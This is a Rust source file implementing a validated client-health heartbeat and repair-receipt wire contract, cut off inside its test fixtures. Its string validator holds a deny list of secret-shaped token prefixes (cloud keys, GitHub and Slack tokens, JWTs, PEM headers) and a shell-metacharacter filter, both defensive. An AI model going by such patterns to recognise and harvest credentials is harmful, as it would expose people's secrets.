//! Client-health wire contract — the Rust adapter of the cross-repo
//! `client-sync-health-control-plane` US-000 contract.
//!
//! ONE versioned contract shared in spirit across four adapters:
//!
//! * hq-pro            `src/sync/server/client-health-contract.ts` (reference)
//! * hq-desktop-app    `crates/hq-desktop-core/src/client_health.rs` (this file)
//! * hq-cli            `src/utils/client-health-contract.ts`
//! * indigo-gtm-hq     `src/lib/client-health.ts`
//!
//! Every adapter uses the SAME wire field names (camelCase) and the SAME enum
//! string values, verified per-repo against byte-equivalent copies of the
//! canonical fixtures (here, embedded in the `tests` module below). The
//! interface, not repository internals, is the shared test surface.
//!
//! Design rules (PRD notes + securityNotes), mirrored from the reference:
//!
//! * ADDITIVE + tolerant of older clients: every non-identity field is
//!   optional-friendly, and unknown EXTRA fields are ignored (a newer client
//!   talking to an older server must not fail). Absence of `updaterState`
//!   means "an older client that never reported it"; the closed value
//!   `"unchecked"` means "the updater has not run yet" — the two are distinct
//!   and must survive the wire (hence `Option<ClientHealthUpdaterState>` and
//!   `skip_serializing_if` on every optional field).
//! * FAIL CLOSED on values: enums are closed sets. Free-form shell text,
//!   customer file paths, secret-shaped values, raw logs, and unknown repair
//!   kinds are rejected with a typed [`ClientHealthContractError`] whose
//!   rendering never echoes the offending raw value.
//! * Monotonic `sequence`: the server keeps the highest sequence seen per
//!   installation and drops older/replayed heartbeats
//!   ([`should_apply_heartbeat`]).

use serde::Serialize;
use serde_json::{Map, Value};
use std::fmt;

// ─── Contract version + bounds ───────────────────────────────────────────────

pub const CLIENT_HEALTH_CONTRACT_VERSION: u64 = 1;

pub const CLIENT_HEALTH_MAX_STRING_LENGTH: usize = 64;
pub const CLIENT_HEALTH_MAX_CONSECUTIVE_FAILURES: u64 = 100_000;
pub const CLIENT_HEALTH_MAX_CONFLICT_COUNT: u64 = 100_000;
pub const CLIENT_HEALTH_MAX_CHECKS: usize = 16;

/// JavaScript `Number.MAX_SAFE_INTEGER` — `sequence`/`revision` stay inside the
/// range every adapter (including the TypeScript ones) can represent exactly.
const MAX_SAFE_INTEGER: u64 = 9_007_199_254_740_991;

/// Ceiling the reference applies to `contractVersion` before the supported-range
/// check, so an absurd version reads `OUT_OF_BOUNDS` rather than `UNSUPPORTED`.
const MAX_CONTRACT_VERSION_FIELD: u64 = 1_000;

/// Secret-shaped prefixes rejected outright even when the charset is otherwise
/// legal (JWTs, cloud keys, PATs, bot tokens fit in 64 bounded chars).
const SECRET_PREFIXES: &[&str] = &[
    "AKIA",
    "ASIA",
    "ghp_",
    "gho_",
    "github_pat_",
    "xox",
    "sk-",
    "eyJ",
    "-----BEGIN",
];

// ─── Errors ──────────────────────────────────────────────────────────────────

/// Typed violation codes, one-to-one with the reference adapter's string codes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClientHealthContractErrorCode {
    MissingField,
    InvalidType,
    UnknownEnumValue,
    UnsafeValue,
    OutOfBounds,
    UnsupportedContractVersion,
}

impl ClientHealthContractErrorCode {
    /// Wire spelling of the code, matching the TypeScript reference exactly.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::MissingField => "MISSING_FIELD",
            Self::InvalidType => "INVALID_TYPE",
            Self::UnknownEnumValue => "UNKNOWN_ENUM_VALUE",
            Self::UnsafeValue => "UNSAFE_VALUE",
            Self::OutOfBounds => "OUT_OF_BOUNDS",
            Self::UnsupportedContractVersion => "UNSUPPORTED_CONTRACT_VERSION",
        }
    }
}

/// A fail-closed contract violation: code + the wire field it occurred at.
///
/// The [`fmt::Display`] rendering deliberately carries ONLY the code and field
/// name — never the offending raw value — so a poisoned payload (shell text,
/// a customer path, a secret) cannot ride an error message into logs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ClientHealthContractError {
    pub code: ClientHealthContractErrorCode,
    pub field: String,
}

impl ClientHealthContractError {
    fn new(code: ClientHealthContractErrorCode, field: impl Into<String>) -> Self {
        Self { code, field: field.into() }
    }
}

impl fmt::Display for ClientHealthContractError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "client-health contract violation [{}] at {}",
            self.code.as_str(),
            self.field
        )
    }
}

impl std::error::Error for ClientHealthContractError {}

// ─── Closed enums ────────────────────────────────────────────────────────────

/// Declares one closed wire enum: serde renames pin the exact wire strings, and
/// `parse_field` fails closed (`UNKNOWN_ENUM_VALUE`) on anything outside the
/// set — after the same bounded-string safety gate every string value passes.
macro_rules! closed_wire_enum {
    ($(#[$meta:meta])* $name:ident { $($variant:ident => $wire:literal),+ $(,)? }) => {
        $(#[$meta])*
        #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
        pub enum $name {
            $( #[serde(rename = $wire)] $variant, )+
        }

        impl $name {
            /// Exact wire spelling of this value.
            pub fn wire_value(self) -> &'static str {
                match self { $( Self::$variant => $wire, )+ }
            }

            fn parse_field(
                field: &str,
                value: Option<&Value>,
            ) -> Result<Self, ClientHealthContractError> {
                let safe = assert_safe_bounded_string(field, value)?;
                match safe.as_str() {
                    $( $wire => Ok(Self::$variant), )+
                    _ => Err(ClientHealthContractError::new(
                        ClientHealthContractErrorCode::UnknownEnumValue,
                        field,
                    )),
                }
            }
        }
    };
}

closed_wire_enum!(
    /// Operating system the installation runs on.
    ClientHealthPlatform {
        Macos => "macos",
        Windows => "windows",
        Linux => "linux",
    }
);

closed_wire_enum!(
    /// CPU architecture of the installation.
    ClientHealthArch {
        X64 => "x64",
        Arm64 => "arm64",
    }
);

closed_wire_enum!(
    /// Which client produced the heartbeat. Desktop is always-on; CLI
    /// contributes per invocation.
    ClientHealthSource {
        Desktop => "desktop",
        Cli => "cli",
    }
);

closed_wire_enum!(
    /// Current sync state of the installation. `paused` and `conflict_blocked`
    /// are first-class states (not failures folded into `error`) because
    /// support treats them differently: pause may be intentional and conflicts
    /// are user-owned.
    ClientHealthSyncState {
        Idle => "idle",
        Syncing => "syncing",
        Paused => "paused",
        ConflictBlocked => "conflict_blocked",
        Error => "error",
        NeverSynced => "never_synced",
    }
);

closed_wire_enum!(
    /// Updater state. ABSENCE of the field means the client is too old to
    /// report it; `"unchecked"` means the updater exists but has not checked
    /// yet. Do not collapse the two (US-000 acceptance: Unchecked vs Absent
    /// must survive).
    ClientHealthUpdaterState {
        Unchecked => "unchecked",
        UpToDate => "up_to_date",
        UpdateAvailable => "update_available",
        UpdateDownloading => "update_downloading",
        UpdateReady => "update_ready",
        UpdateFailed => "update_failed",
        Unsupported => "unsupported",
    }
);

closed_wire_enum!(
    /// Closed failure/blocker reason codes — the ONLY reasons that cross the
    /// wire.
    ClientHealthFailureReason {
        SyncPaused => "SYNC_PAUSED",
        ConflictBlocked => "CONFLICT_BLOCKED",
        DesktopOutdated => "DESKTOP_OUTDATED",
        CliOutdated => "CLI_OUTDATED",
        CoreOutdated => "CORE_OUTDATED",
        AuthExpired => "AUTH_EXPIRED",
        UpdateFailed => "UPDATE_FAILED",
        RunnerFailed => "RUNNER_FAILED",
        PermissionDenied => "PERMISSION_DENIED",
        DiskFull => "DISK_FULL",
        HeartbeatStale => "HEARTBEAT_STALE",
        // client-sync-health-control-plane US-009/US-010 (decision ledger #7):
        // the closed outcome of an APPLY_DESKTOP_UPDATE the platform updater
        // will not attest safe (e.g. an unsupported Windows build). Distinct
        // from UPDATE_FAILED — the update did not fail, it was never attempted
        // and a human must act. Mirrors hq-pro's `MANUAL_ACTION_REQUIRED`.
        ManualActionRequired => "MANUAL_ACTION_REQUIRED",
    }
);

closed_wire_enum!(
    /// Repair/diagnostic command allowlist (US-006/US-009 consume these
    /// shapes). A desired-state interface, never a remote shell — any kind
    /// outside this set fails closed.
    ClientHealthRepairKind {
        CheckNow => "CHECK_NOW",
        RetrySync => "RETRY_SYNC",
        ResumeSync => "RESUME_SYNC",
        RepairCli => "REPAIR_CLI",
        UpdateCore => "UPDATE_CORE",
        ApplyDesktopUpdate => "APPLY_DESKTOP_UPDATE",
        RestartApp => "RESTART_APP",
    }
);

closed_wire_enum!(
    /// Command/receipt lifecycle states (queued → acknowledged → running →
    /// terminal).
    ///
    /// `Canceled` (client-sync-health-control-plane US-009) is a TERMINAL,
    /// server-only state reached from `queued` via the admin cancel path —
    /// never a receipt target and never reachable once a client has
    /// acknowledged the command. Being terminal, it is structurally invisible
    /// to the client-facing desired-state read, so this client never has to
    /// act on it; it is carried here only so an INCOMING receipt/command
    /// projection that mentions it parses tolerantly rather than failing
    /// closed on an otherwise-legal state.
    ClientHealthCommandState {
        Queued => "queued",
        Acknowledged => "acknowledged",
        Running => "running",
        Succeeded => "succeeded",
        Failed => "failed",
        Expired => "expired",
        Canceled => "canceled",
    }
);

closed_wire_enum!(
    /// Confirmation a repair intent requires before a client acts on it
    /// (client-sync-health-control-plane US-009). SERVER-DERIVED from the kind,
    /// never caller-selected: `consequence` for the customer-visible/disruptive
    /// kinds (RESUME_SYNC overrides an intentional local pause; RESTART_APP
    /// interrupts the running app), `none` otherwise. Mirrors hq-pro's
    /// `CLIENT_HEALTH_CONFIRMATION_LEVELS`.
    ClientHealthConfirmationLevel {
        None => "none",
        Consequence => "consequence",
    }
);

closed_wire_enum!(
    /// Closed diagnostic probe identifiers (US-007).
    ClientHealthDiagnosticCheck {
        Auth => "auth",
        Runner => "runner",
        Cli => "cli",
        Core => "core",
        Updater => "updater",
        Sync => "sync",
        Conflicts => "conflicts",
        Storage => "storage",
        Permissions => "permissions",
    }
);

closed_wire_enum!(
    /// Outcome of one diagnostic check.
    ClientHealthCheckStatus {
        Pass => "pass",
        Fail => "fail",
        Skip => "skip",
    }
);

// ─── Wire types ──────────────────────────────────────────────────────────────

/// The four client versions. All optional: a CLI-only installation has no
/// desktop/syncRunner version, and older clients may omit any of them.
#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ClientHealthVersions {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub desktop: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub cli: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub core: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub sync_runner: Option<String>,
}

/// One validated heartbeat.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ClientHealthHeartbeat {
    pub contract_version: u64,
    /// Stable random installation identity — NOT a hardware fingerprint.
    pub installation_id: String,
    pub source: ClientHealthSource,
    pub platform: ClientHealthPlatform,
    pub arch: ClientHealthArch,
    /// Client-side emit time (liveness); the server also stamps receive time.
    pub sent_at: String,
    /// Monotonic per-installation sequence — older/replayed values never
    /// overwrite newer state.
    pub sequence: u64,
    pub versions: ClientHealthVersions,
    pub sync_state: ClientHealthSyncState,
    /// Last time a sync RUN started — distinct from success.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_sync_attempt_at: Option<String>,
    /// Advances only on genuine success (including no-change runs).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_sync_success_at: Option<String>,
    pub consecutive_failures: u64,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub conflict_count: Option<u64>,
    /// `None` = older client that never reported it; `Some(Unchecked)` = the
    /// updater exists but has not run. The two are distinct on the wire.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub updater_state: Option<ClientHealthUpdaterState>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub failure_reason: Option<ClientHealthFailureReason>,
}

/// One validated diagnostic-check result.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ClientHealthCheckResult {
    pub check: ClientHealthDiagnosticCheck,
    pub status: ClientHealthCheckStatus,
    /// Present only on `fail` — a closed reason code, never prose.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub reason: Option<ClientHealthFailureReason>,
}

/// Closed per-kind repair arguments (client-sync-health-control-plane US-009).
/// A DESIRED-STATE argument object, never a command line: the only key the
/// schema reserves is a SemVer `targetVersion` for the three version-moving
/// kinds (REPAIR_CLI / UPDATE_CORE / APPLY_DESKTOP_UPDATE). Per decision
/// ledger #5 that key is RESERVED but not yet honoured — repairs run
/// "latest-in-channel". Every other kind permits no args at all. Unknown keys
/// are rejected ([`parse_client_health_repair_args`]) so a conflict-resolution
/// choice, a shell fragment, or any other free-form steering value
/// structurally cannot ride in on `args`. Mirrors hq-pro's
/// `ClientHealthRepairArgs`.
#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ClientHealthRepairArgs {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub target_version: Option<String>,
}

/// Verified postcondition a client attaches to a terminal repair receipt
/// (client-sync-health-control-plane US-009/US-010): the closed, bounded proof
/// the repair actually took effect (e.g. the version read back after a
/// CLI/Core repair, or the observed sync state after RESUME_SYNC). `verified`
/// is the client's own attestation; GTM still only calls an installation
/// "recovered" once a later proving heartbeat confirms it. Mirrors hq-pro's
/// `ClientHealthCommandPostcondition`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ClientHealthCommandPostcondition {
    pub verified: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub versions: Option<ClientHealthVersions>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub sync_state: Option<ClientHealthSyncState>,
}

/// Receipt for a diagnostic or repair command (US-006+ store these). `checks`
/// is only meaningful for `CHECK_NOW`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ClientHealthCommandReceipt {
    pub contract_version: u64,
    pub command_id: String,
    pub installation_id: String,
    pub kind: ClientHealthRepairKind,
    pub state: ClientHealthCommandState,
    /// Monotonic per-command revision — out-of-order receipt updates fail
    /// closed downstream.
    pub revision: u64,
    pub occurred_at: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub checks: Option<Vec<ClientHealthCheckResult>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub failure_reason: Option<ClientHealthFailureReason>,
    /// US-009/US-010: verified proof a repair took effect (closed, bounded).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub postcondition: Option<ClientHealthCommandPostcondition>,
    /// US-009/US-010: closed "the platform will not attest this safe, a human
    /// must act" outcome (e.g. an unsupported Windows updater state). Paired
    /// with the [`ClientHealthFailureReason::ManualActionRequired`] reason.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub manual_action_required: Option<bool>,
}

// ─── Value validators (fail closed) ──────────────────────────────────────────

/// Bounded 1..=64, no whitespace/newline, no shell metacharacters, no
/// path-shaped values, no secret-shaped prefixes. Mirrors the reference's
/// `assertSafeBoundedString` exactly, including its error-code choices.
fn assert_safe_bounded_string(
    field: &str,
    value: Option<&Value>,
) -> Result<String, ClientHealthContractError> {
    let value = match value {
        None | Some(Value::Null) => {
            return Err(ClientHealthContractError::new(
                ClientHealthContractErrorCode::MissingField,
                field,
            ));
        }
        Some(Value::String(text)) => text,
        Some(_) => {
            return Err(ClientHealthContractError::new(
                ClientHealthContractErrorCode::InvalidType,
                field,
            ));
        }
    };
    let length = value.chars().count();
    if length == 0 || length > CLIENT_HEALTH_MAX_STRING_LENGTH {
        return Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::OutOfBounds,
            field,
        ));
    }
    // Raw logs / free-form shell text: any whitespace, newline, or shell
    // metacharacter.
    let is_shell_meta = |c: char| {
        matches!(
            c,
            ';' | '|' | '&' | '$' | '<' | '>' | '`' | '\'' | '"' | '(' | ')' | '{' | '}' | '*'
                | '?' | '!' | '#' | '=' | ','
        )
    };
    if value.chars().any(|c| c.is_whitespace() || is_shell_meta(c)) {
        return Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::UnsafeValue,
            field,
        ));
    }
    // Customer paths: separators, home refs, drive letters.
    let mut chars = value.chars();
    let first = chars.next();
    let second = chars.next();
    let drive_letter = matches!((first, second), (Some(letter), Some(':')) if letter.is_ascii_alphabetic());
    if value.contains('/') || value.contains('\\') || value.starts_with('~') || drive_letter {
        return Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::UnsafeValue,
            field,
        ));
    }
    if SECRET_PREFIXES.iter().any(|prefix| value.starts_with(prefix)) {
        return Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::UnsafeValue,
            field,
        ));
    }
    Ok(value.clone())
}

/// Strict SemVer — the same shape the sync-auth middleware enforces on
/// `x-hq-*-version` headers. The `semver` crate (already a dependency)
/// implements the identical semver.org grammar the reference regex encodes.
fn assert_version(field: &str, value: Option<&Value>) -> Result<String, ClientHealthContractError> {
    let safe = assert_safe_bounded_string(field, value)?;
    if semver::Version::parse(&safe).is_err() {
        return Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::UnsafeValue,
            field,
        ));
    }
    Ok(safe)
}

/// `^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d{1,3})?Z$` plus calendar validity.
fn assert_iso_utc(field: &str, value: Option<&Value>) -> Result<String, ClientHealthContractError> {
    let safe = assert_safe_bounded_string(field, value)?;
    if !is_iso_utc_shape(&safe) || chrono::DateTime::parse_from_rfc3339(&safe).is_err() {
        return Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::UnsafeValue,
            field,
        ));
    }
    Ok(safe)
}

/// Hand-rolled equivalent of the reference's `ISO_UTC` regex (no regex crate in
/// this crate's dependency set): `YYYY-MM-DDTHH:MM:SS(.mmm)?Z`, fraction 1..=3
/// digits.
fn is_iso_utc_shape(value: &str) -> bool {
    let bytes = value.as_bytes();
    if bytes.len() < 20 || bytes.len() > 24 {
        return false;
    }
    let digit = |index: usize| bytes[index].is_ascii_digit();
    let base_ok = digit(0)
        && digit(1)
        && digit(2)
        && digit(3)
        && bytes[4] == b'-'
        && digit(5)
        && digit(6)
        && bytes[7] == b'-'
        && digit(8)
        && digit(9)
        && bytes[10] == b'T'
        && digit(11)
        && digit(12)
        && bytes[13] == b':'
        && digit(14)
        && digit(15)
        && bytes[16] == b':'
        && digit(17)
        && digit(18);
    if !base_ok {
        return false;
    }
    let tail = &bytes[19..];
    match tail {
        [b'Z'] => true,
        [b'.', fraction @ .., b'Z'] => {
            (1..=3).contains(&fraction.len()) && fraction.iter().all(u8::is_ascii_digit)
        }
        _ => false,
    }
}

/// `^[A-Za-z0-9][A-Za-z0-9_-]{7,63}$` — installation and command identities.
fn is_wire_id(value: &str) -> bool {
    let bytes = value.as_bytes();
    if bytes.len() < 8 || bytes.len() > 64 {
        return false;
    }
    bytes[0].is_ascii_alphanumeric()
        && bytes[1..]
            .iter()
            .all(|b| b.is_ascii_alphanumeric() || *b == b'_' || *b == b'-')
}

/// A non-negative integer within `0..=max`. Non-integers are `INVALID_TYPE`;
/// negative or too-large values are `OUT_OF_BOUNDS` (matching the reference's
/// `assertBoundedInt`).
fn assert_bounded_int(
    field: &str,
    value: Option<&Value>,
    max: u64,
) -> Result<u64, ClientHealthContractError> {
    let number = match value {
        None | Some(Value::Null) => {
            return Err(ClientHealthContractError::new(
                ClientHealthContractErrorCode::MissingField,
                field,
            ));
        }
        Some(Value::Number(number)) => number,
        Some(_) => {
            return Err(ClientHealthContractError::new(
                ClientHealthContractErrorCode::InvalidType,
                field,
            ));
        }
    };
    if let Some(unsigned) = number.as_u64() {
        if unsigned > max {
            return Err(ClientHealthContractError::new(
                ClientHealthContractErrorCode::OutOfBounds,
                field,
            ));
        }
        return Ok(unsigned);
    }
    if number.as_i64().is_some() {
        // A representable integer that failed `as_u64` is negative.
        return Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::OutOfBounds,
            field,
        ));
    }
    Err(ClientHealthContractError::new(
        ClientHealthContractErrorCode::InvalidType,
        field,
    ))
}

/// A strict JSON boolean. Anything else (including `null`, `0`/`1`, `"true"`)
/// fails closed, matching the reference's `assertBoolean`.
fn assert_boolean(field: &str, value: Option<&Value>) -> Result<bool, ClientHealthContractError> {
    match value {
        None | Some(Value::Null) => Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::MissingField,
            field,
        )),
        Some(Value::Bool(flag)) => Ok(*flag),
        Some(_) => Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::InvalidType,
            field,
        )),
    }
}

/// Parse + validate the four optional SemVer client versions (fail closed).
/// Shared by the heartbeat parser and the postcondition parser.
fn parse_versions(
    field: &str,
    value: &Value,
) -> Result<ClientHealthVersions, ClientHealthContractError> {
    let raw = as_object(field, Some(value))?;
    let mut versions = ClientHealthVersions::default();
    for (key, slot) in [
        ("desktop", &mut versions.desktop),
        ("cli", &mut versions.cli),
        ("core", &mut versions.core),
        ("syncRunner", &mut versions.sync_runner),
    ] {
        if let Some(entry) = raw.get(key) {
            *slot = Some(assert_version(&format!("{field}.{key}"), Some(entry))?);
        }
    }
    Ok(versions)
}

/// Parse + validate a [`ClientHealthRepairArgs`] object (US-009). The ONLY key
/// the wire schema knows is a SemVer `targetVersion`; any other key is a
/// fail-closed rejection so a conflict-resolution choice, a shell fragment, or
/// any other free-form steering value structurally cannot ride in on `args`.
/// Mirrors hq-pro's `parseClientHealthRepairArgs`.
pub fn parse_client_health_repair_args(
    field: &str,
    value: &Value,
) -> Result<ClientHealthRepairArgs, ClientHealthContractError> {
    let raw = as_object(field, Some(value))?;
    let mut args = ClientHealthRepairArgs::default();
    for key in raw.keys() {
        if key != "targetVersion" {
            return Err(ClientHealthContractError::new(
                ClientHealthContractErrorCode::UnknownEnumValue,
                format!("{field}.{key}"),
            ));
        }
    }
    if let Some(entry) = raw.get("targetVersion") {
        args.target_version = Some(assert_version(&format!("{field}.targetVersion"), Some(entry))?);
    }
    Ok(args)
}

/// Parse + validate a [`ClientHealthCommandPostcondition`] (US-009). Closed and
/// bounded: a boolean, optional SemVer versions, and an optional closed sync
/// state — no free-form field can appear. Mirrors hq-pro's
/// `parseClientHealthPostcondition`.
fn parse_postcondition(
    field: &str,
    value: &Value,
) -> Result<ClientHealthCommandPostcondition, ClientHealthContractError> {
    let raw = as_object(field, Some(value))?;
    let mut postcondition = ClientHealthCommandPostcondition {
        verified: assert_boolean(&format!("{field}.verified"), raw.get("verified"))?,
        versions: None,
        sync_state: None,
    };
    if let Some(entry) = raw.get("versions") {
        postcondition.versions = Some(parse_versions(&format!("{field}.versions"), entry)?);
    }
    if let Some(entry) = raw.get("syncState") {
        postcondition.sync_state = Some(ClientHealthSyncState::parse_field(
            &format!("{field}.syncState"),
            Some(entry),
        )?);
    }
    Ok(postcondition)
}

fn as_object<'a>(
    field: &str,
    value: Option<&'a Value>,
) -> Result<&'a Map<String, Value>, ClientHealthContractError> {
    match value {
        Some(Value::Object(map)) => Ok(map),
        _ => Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::InvalidType,
            field,
        )),
    }
}

fn assert_supported_contract_version(
    raw: &Map<String, Value>,
) -> Result<u64, ClientHealthContractError> {
    let contract_version = assert_bounded_int(
        "contractVersion",
        raw.get("contractVersion"),
        MAX_CONTRACT_VERSION_FIELD,
    )?;
    if contract_version < 1 || contract_version > CLIENT_HEALTH_CONTRACT_VERSION {
        return Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::UnsupportedContractVersion,
            "contractVersion",
        ));
    }
    Ok(contract_version)
}

fn assert_id(field: &str, value: Option<&Value>) -> Result<String, ClientHealthContractError> {
    let id = assert_safe_bounded_string(field, value)?;
    if !is_wire_id(&id) {
        return Err(ClientHealthContractError::new(
            ClientHealthContractErrorCode::UnsafeValue,
            field,
        ));
    }
    Ok(id)
}

// ─── Parsers ─────────────────────────────────────────────────────────────────

/// Parse + validate one heartbeat. Unknown extra fields are ignored (additive
/// tolerance); every consumed value fails closed on unsafe content.
pub fn parse_client_health_heartbeat(
    value: &Value,
) -> Result<ClientHealthHeartbeat, ClientHealthContractError> {
    let raw = as_object("heartbeat", Some(value))?;
    let contract_version = assert_supported_contract_version(raw)?;
    let installation_id = assert_id("installationId", raw.get("installationId"))?;

    let raw_versions = as_object("versions", raw.get("versions"))?;
    let mut versions = ClientHealthVersions::default();
    for (key, slot) in [
        ("desktop", &mut versions.desktop),
        ("cli", &mut versions.cli),
        ("core", &mut versions.core),
        ("syncRunner", &mut versions.sync_runner),
    ] {
        if let Some(entry) = raw_versions.get(key) {
            *slot = Some(assert_version(&format!("versions.{key}"), Some(entry))?);
        }
    }

    let mut heartbeat = ClientHealthHeartbeat {
        contract_version,
        installation_id,
        source: ClientHealthSource::parse_field("source", raw.get("source"))?,
        platform: ClientHealthPlatform::parse_field("platform", raw.get("platform"))?,
        arch: ClientHealthArch::parse_field("arch", raw.get("arch"))?,
        sent_at: assert_iso_utc("sentAt", raw.get("sentAt"))?,
        sequence: assert_bounded_int("sequence", raw.get("sequence"), MAX_SAFE_INTEGER)?,
        versions,
        sync_state: ClientHealthSyncState::parse_field("syncState", raw.get("syncState"))?,
        last_sync_attempt_at: None,
        last_sync_success_at: None,
        consecutive_failures: assert_bounded_int(
            "consecutiveFailures",
            raw.get("consecutiveFailures"),
            CLIENT_HEALTH_MAX_CONSECUTIVE_FAILURES,
        )?,
        conflict_count: None,
        updater_state: None,
        failure_reason: None,
    };
    if let Some(entry) = raw.get("lastSyncAttemptAt") {
        heartbeat.last_sync_attempt_at = Some(assert_iso_utc("lastSyncAttemptAt", Some(entry))?);
    }
    if let Some(entry) = raw.get("lastSyncSuccessAt") {
        heartbeat.last_sync_success_at = Some(assert_iso_utc("lastSyncSuccessAt", Some(entry))?);
    }
    if let Some(entry) = raw.get("conflictCount") {
        heartbeat.conflict_count = Some(assert_bounded_int(
            "conflictCount",
            Some(entry),
            CLIENT_HEALTH_MAX_CONFLICT_COUNT,
        )?);
    }
    if let Some(entry) = raw.get("updaterState") {
        heartbeat.updater_state = Some(ClientHealthUpdaterState::parse_field(
            "updaterState",
            Some(entry),
        )?);
    }
    if let Some(entry) = raw.get("failureReason") {
        heartbeat.failure_reason = Some(ClientHealthFailureReason::parse_field(
            "failureReason",
            Some(entry),
        )?);
    }
    Ok(heartbeat)
}

/// Parse + validate one diagnostic/repair command receipt. Unknown kinds fail
/// closed.
pub fn parse_client_health_command_receipt(
    value: &Value,
) -> Result<ClientHealthCommandReceipt, ClientHealthContractError> {
    let raw = as_object("receipt", Some(value))?;
    let contract_version = assert_supported_contract_version(raw)?;
    let mut receipt = ClientHealthCommandReceipt {
        contract_version,
        command_id: assert_id("commandId", raw.get("commandId"))?,
        installation_id: assert_id("installationId", raw.get("installationId"))?,
        kind: ClientHealthRepairKind::parse_field("kind", raw.get("kind"))?,
        state: ClientHealthCommandState::parse_field("state", raw.get("state"))?,
        revision: assert_bounded_int("revision", raw.get("revision"), MAX_SAFE_INTEGER)?,
        occurred_at: assert_iso_utc("occurredAt", raw.get("occurredAt"))?,
        checks: None,
        failure_reason: None,
        postcondition: None,
        manual_action_required: None,
    };
    if let Some(entry) = raw.get("failureReason") {
        receipt.failure_reason = Some(ClientHealthFailureReason::parse_field(
            "failureReason",
            Some(entry),
        )?);
    }
    if let Some(entry) = raw.get("postcondition") {
        receipt.postcondition = Some(parse_postcondition("postcondition", entry)?);
    }
    if let Some(entry) = raw.get("manualActionRequired") {
        receipt.manual_action_required =
            Some(assert_boolean("manualActionRequired", Some(entry))?);
    }
    if let Some(entry) = raw.get("checks") {
        let Value::Array(entries) = entry else {
            return Err(ClientHealthContractError::new(
                ClientHealthContractErrorCode::InvalidType,
                "checks",
            ));
        };
        if entries.len() > CLIENT_HEALTH_MAX_CHECKS {
            return Err(ClientHealthContractError::new(
                ClientHealthContractErrorCode::OutOfBounds,
                "checks",
            ));
        }
        let mut checks = Vec::with_capacity(entries.len());
        for (index, entry) in entries.iter().enumerate() {
            let check = as_object(&format!("checks[{index}]"), Some(entry))?;
            let mut result = ClientHealthCheckResult {
                check: ClientHealthDiagnosticCheck::parse_field(
                    &format!("checks[{index}].check"),
                    check.get("check"),
                )?,
                status: ClientHealthCheckStatus::parse_field(
                    &format!("checks[{index}].status"),
                    check.get("status"),
                )?,
                reason: None,
            };
            if let Some(reason) = check.get("reason") {
                result.reason = Some(ClientHealthFailureReason::parse_field(
                    &format!("checks[{index}].reason"),
                    Some(reason),
                )?);
            }
            checks.push(result);
        }
        receipt.checks = Some(checks);
    }
    Ok(receipt)
}

// ─── Sequence discipline ─────────────────────────────────────────────────────

/// True when an incoming heartbeat sequence may replace the stored snapshot.
/// Equal or older sequences are late deliveries/replays: drop them (the server
/// answers idempotently and the current snapshot remains unchanged).
pub fn should_apply_heartbeat(stored_sequence: Option<u64>, incoming_sequence: u64) -> bool {
    match stored_sequence {
        None => true,
        Some(stored) => incoming_sequence > stored,
    }
}

// ─── Tests (canonical cross-repo fixtures) ───────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    // Byte-equivalent copies of hq-pro's test/fixtures/client-health.ts — the
    // shared cross-repo test surface. Field names and values must stay
    // identical across all four adapters; keep additions ADDITIVE and update
    // every copy in the same change.

    const HEARTBEAT_HEALTHY: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-4f9d2c1a8b7e",
        "source": "desktop",
        "platform": "macos",
        "arch": "arm64",
        "sentAt": "2026-09-03T17:05:00.000Z",
        "sequence": 412,
        "versions": { "desktop": "1.42.3", "cli": "5.106.2", "core": "3.18.0", "syncRunner": "5.106.2" },
        "syncState": "idle",
        "lastSyncAttemptAt": "2026-09-03T17:00:00.000Z",
        "lastSyncSuccessAt": "2026-09-03T17:00:00.000Z",
        "consecutiveFailures": 0,
        "conflictCount": 0,
        "updaterState": "up_to_date"
    }"#;

    const HEARTBEAT_PAUSED: &str = r#"{
        "contractVersion": 1,
        "installationId": "inst-9a11c0de2f34",
        "source": "desktop",
        "platform": "macos",
